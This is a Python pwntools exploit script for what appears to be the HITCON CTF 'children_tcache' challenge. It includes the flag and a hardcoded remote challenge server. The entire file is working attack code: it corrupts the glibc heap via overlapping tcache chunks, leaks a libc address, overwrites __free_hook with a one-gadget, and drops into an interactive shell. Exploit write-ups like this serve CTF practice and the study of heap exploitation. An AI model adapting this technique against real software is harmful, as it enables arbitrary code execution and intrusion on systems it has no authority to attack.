from pwn import *
import sys
from time import time

LOCAL_LIBC32 = "/lib/i386-linux-gnu/libc.so.6"
LOCAL_LIBC64 = "/lib/x86_64-linux-gnu/libc.so.6"

BINARY = "./children_tcache"
LIBC = "./libc.so.6"
LOCAL_LIBC = LOCAL_LIBC64

# flag: hitcon{l4st_rem41nd3r_1s_v3ry_us3ful}

context.clear()
context(os="linux", arch="amd64", bits=64)
#context.log_level = 'debug'

# def recvsend(conn, data):
#     conn.recvline()
#     conn.sendline(data)

def recvmenu(conn):
    conn.recvuntil("Your choice: ")

def newheap(conn, sz, data):
    recvmenu(conn)
    conn.sendline("1")
    conn.recvuntil("Size:")
    conn.sendline(str(sz))
    conn.recvuntil("Data:")
    conn.send(data)

def showheap(conn, idx):
    recvmenu(conn)
    conn.sendline("2")
    conn.recvuntil("Index:")
    conn.sendline(str(idx))

def deleteheap(conn, idx):
    recvmenu(conn)
    conn.sendline("3")
    conn.recvuntil("Index:")
    conn.sendline(str(idx))

def exploit(conn, elf, libc, local):
    newheap(conn, 0x1060, "A"*10) # 0
    newheap(conn, 10, "A"*10) # 1
    newheap(conn, 10, "A"*10) # 2
    newheap(conn, 0xff0, "A"*0x10) # 3
    newheap(conn, 10, "A"*10) # 4

    deleteheap(conn, 0)
    deleteheap(conn, 2)

    newheap(conn, 0x18, "A"*0x18) # 0
    deleteheap(conn, 0)

    for i in range(5):
        newheap(conn, 0x17-i, "A"*(0x17-i))
        deleteheap(conn, 0)

    newheap(conn, 0x12, "A"*0x10 + "\xb0\x10") # 0

    deleteheap(conn, 3)
    deleteheap(conn, 0)

    newheap(conn, 0x1060, "A"*10) # 0

    showheap(conn, 1)
    libc.address = u64(conn.recv(6).ljust(8, "\x00")) - 0x3ebca0
    log.info("%#x", libc.address)

    newheap(conn, 0x28, "A"*0x20 + p64(libc.symbols['__free_hook']))

    newheap(conn, 0x10, "aaa")
    newheap(conn, 0x10, p64(libc.address + 0x4f322))

    deleteheap(conn, 0)

    conn.interactive()
    return

if __name__ == "__main__":
    elf = ELF(BINARY)
    try:
        if sys.argv[1] == "remote":
            H,P = ("54.178.132.125", 8763)
            r = remote(H, P)
            libc = ELF(LIBC) if LIBC else None
            exploit(r, elf, libc, local=False)
        elif sys.argv[1] == "local":
            r = process(BINARY)
            log.info("PID: {}".format(r.proc.pid))
            libc = ELF(LOCAL_LIBC) if LOCAL_LIBC else None
            pause()
            exploit(r, elf, libc, local=True)
        elif sys.argv[1] == "docker":
            r = process(BINARY, env = {"LD_PRELOAD": LIBC})
            libc = ELF(LIBC) if LIBC else None
            pause()
            exploit(r, elf, libc, local=True)
        else:
            print "Usage: {} local|docker|remote".format(sys.argv[0])
            sys.exit(1)
    except IndexError:
        r = process(BINARY)
        log.info("PID: {}".format(r.proc.pid))
        libc = ELF(LOCAL_LIBC) if LOCAL_LIBC else None
        pause()
        exploit(r, elf, libc, local=True)
